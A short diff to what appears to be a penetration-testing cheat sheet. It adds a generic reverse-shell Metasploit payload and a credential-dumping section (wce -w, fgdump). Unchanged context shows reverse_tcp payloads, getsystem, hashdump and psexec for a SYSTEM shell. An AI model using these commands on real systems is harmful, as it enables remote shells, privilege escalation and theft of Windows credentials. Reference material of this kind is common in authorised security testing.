@@ -424,10 +424,17 @@ msf > set payload windows/shell/reverse_tcp
 msf > run*
     Other payloads:
     *set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD generic/shell_reverse_tcp
 set PAYLOAD linux/x86/meterpreter/reverse_tcp*
     Privilege escalation
     *getsystem
 hashdump*
+
+Hash dump
+    *wce32.exe -w
+wce64.exe -w
+fgdump.exe*
+
 
 From admin to system
     *psexec.exe -i -s %SystemRoot%\system32\cmd.exe*
